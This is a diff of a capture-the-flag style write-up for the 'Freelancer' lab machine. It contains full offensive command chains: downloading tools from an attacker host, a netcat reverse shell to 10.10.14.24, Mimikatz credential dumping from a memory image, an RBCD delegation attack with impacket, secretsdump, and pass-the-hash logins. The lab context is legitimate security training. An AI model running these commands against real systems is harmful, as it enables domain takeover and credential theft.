@@ -206,6 +206,7 @@ crackmapexec smb 10.129.230.52 -u names.txt -p pass.txt -d freelancer
 **mikasaAckerman** : **IL0v3ErenY3ager**
 
 - Upload RunasCs.exe and nc64.exe to /temp:
+
 ```bash
 (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.24/RunasCs.exe', 'C:\temp\RunasCs.exe')
 
@@ -213,6 +214,7 @@ crackmapexec smb 10.129.230.52 -u names.txt -p pass.txt -d freelancer
 
 ```
 - Run as different user:
+
 ```bash
 ./RunasCs.exe mikasaAckerman IL0v3ErenY3ager "./nc.exe -e powershell 10.10.14.24 8889"
 
@@ -263,7 +265,8 @@ We can use **Volatility, MemProcFS, Mimikatz, WinDbg**, etc
 - <u>OPTION 1 -</u> MemProcFS on Linux:
 <https://github.com/ufrisk/MemProcFS>
 
-- Download binary
+- Download binary:
+
 ```bash
 mkdir /mnt/test
 ./memprocfs -device ~/HTB/Season5/Freelancer/MEMORY.DMP -forensic 1 -mount /mnt/test -license-accept-elastic-license-2-0
@@ -287,6 +290,7 @@ MemProcFS_files_and_binaries_v5.9.17-win_x64-20240603\\**plugins**\\ folder
 ![image32](../resources/2ce920ef2b2e41068386f1af1ebba45f.png)
 
 - Run:
+
 ```bash
 .\MemProcFS.exe -device C:\Users\User\Desktop\MEMORY.DMP -forensic 1 -mount Q -license-accept-elastic-license-2-0
 
@@ -307,6 +311,7 @@ Q:\py\regsecrets\all
 
 - <u>OPTION 3 - WinDbg + Mimikatz:</u>
   - Install with:
+
 ```bash
 winget install Microsoft.WinDbg
 
@@ -324,8 +329,8 @@ winget install Microsoft.WinDbg
 <https://jamescoote.co.uk/Dumping-LSASS-with-SharpShere/>
 
 - Download Mimikatz and load Mimilib.dll from within WinDbg:
-```bash
 
+```bash
 .load \\vmware-host\Shared Folders\VM Share\mimikatz-master\mimikatz-master\x64\mimilib.dll
 
 ```
@@ -339,6 +344,7 @@ winget install Microsoft.WinDbg
 ![image36](../resources/e3fc5e18ff3f4ecea0743f3622a8dada.png)
 
 - Switch to that process:
+
 ```bash
 .process /r /p ffffbc83a93e7080
 
@@ -347,6 +353,7 @@ winget install Microsoft.WinDbg
 ![image37](../resources/40cfa7edfa384bd4a5eb3149453de3fa.png)
 
 - Get dump:
+
 ```bash
 !mimikatz
 
@@ -373,6 +380,7 @@ This command forces Windbg to reload the symbols (and downloads missing ones)
 ![image40](../resources/1a5661abc37340b080ae86bdba1dafc1.png)
 
 - Put all the users in a file - users:
+
 ```bash
 crackmapexec smb freelancer.htb -u users -p pass
 
@@ -387,6 +395,7 @@ evil-winrm -i freelancer.htb -u lorra199 -p 'PWN3D#l0rr@Armessa199'
 ![image41](../resources/adb70920b6e24683bd1085072f14d570.png)
 
 - Run bloodhound remotely:
+
 ```bash
 bloodhound-python -c all -u lorra199 -p 'PWN3D#l0rr@Armessa199' -ns 10.129.213.81 -d freelancer.htb
 
@@ -408,35 +417,40 @@ bloodhound-python -c all -u lorra199 -p 'PWN3D#l0rr@Armessa199' -ns 10.129.213.8
 <https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5>
 
 - Set the date and time to DC time:
+
 ```bash
 sudo date -s "2024-06-07 16:35:00" && sudo hwclock --systohc
 
 ```
 - Add a new machine account to use:
+
 ```bash
-impacket-addcomputer -computer-name 'rbcd-test\$' -computer-pass 'Password1!' -dc-ip 10.129.213.81 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
+impacket-addcomputer -computer-name 'rbcd-test$' -computer-pass 'Password1!' -dc-ip 10.129.213.81 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
 
 ```
 
 ![image46](../resources/74c05d3d495448ba9cd99d9e1b235b7d.png)
 
 - Write:
+
 ```bash
-impacket-rbcd -delegate-from 'rbcd-test\$' -delegate-to 'DC\$' -dc-ip '10.129.213.81' -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
+impacket-rbcd -delegate-from 'rbcd-test$' -delegate-to 'DC\$' -dc-ip '10.129.213.81' -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
 
 ```
 
 ![image47](../resources/2bf5ddffc27c4551a1a81fc0d69e3258.png)
 
 - Read (it shows lorra199 because I added her in a test attempt):
+
 ```bash
-impacket-rbcd -delegate-to 'DC\$' -dc-ip '10.129.213.81' -action 'read' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
+impacket-rbcd -delegate-to 'DC$' -dc-ip '10.129.213.81' -action 'read' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
 
 ```
 
 ![image48](../resources/bcf75c0fa0bf4873a6f6843acab9c064.png)
 
 - Get service ticket:
+
 ```bash
 impacket-getST -spn "cifs/dc.freelancer.htb" -impersonate Administrator -dc-ip 10.129.213.81 'freelancer.htb/rbcd-test:Password1!'
 
@@ -447,6 +461,7 @@ impacket-getST -spn "cifs/dc.freelancer.htb" -impersonate Administrator -dc-ip 1
 Make sure **dc.freelancer.htb is in /etc/hosts**
 
 - Dump secrets:
+
 ```bash
 impacket-secretsdump freelancer.htb/Administrator@dc.freelancer.htb -k -no-pass -just-dc-user Administrator
 
@@ -455,6 +470,7 @@ impacket-secretsdump freelancer.htb/Administrator@dc.freelancer.htb -k -no-pass 
 ![image50](../resources/9a1240830d154cc6a447d46682b9ef27.png)
 
 - Login with evil-winrm:
+
 ```bash
 evil-winrm -i freelancer.htb -u Administrator -H 0039318f1e8274633445bce32ad1a290
 
@@ -469,15 +485,17 @@ evil-winrm -i freelancer.htb -u Administrator -H 0039318f1e8274633445bce32ad1a29
 ![image52](../resources/4f1c2a9516f9459b82f0cb8ee0864803.png)
 
 - Using BloodyAD - we can add RBCD for a service:
+
 ```bash
-./bloodyAD.py -d freelancer.htb --host 10.129.213.81 -u lorra199 -p 'PWN3D#l0rr@Armessa199' add rbcd DC\$ lorra199
+./bloodyAD.py -d freelancer.htb --host 10.129.213.81 -u lorra199 -p 'PWN3D#l0rr@Armessa199' add rbcd DC$ lorra199
 
 ```
 The above command didn't work because Python url parser broke the string at the \#
 
 - So I converted the password to an NTLM hash online and used that:
+
 ```bash
-./bloodyAD.py -p ':67D4AE78A155AAB3D4AA602DA518C051' -d freelancer.htb --host 10.129.213.81 -u lorra199 add rbcd DC\$ lorra199
+./bloodyAD.py -p ':67D4AE78A155AAB3D4AA602DA518C051' -d freelancer.htb --host 10.129.213.81 -u lorra199 add rbcd DC$ lorra199
 
 ```
 
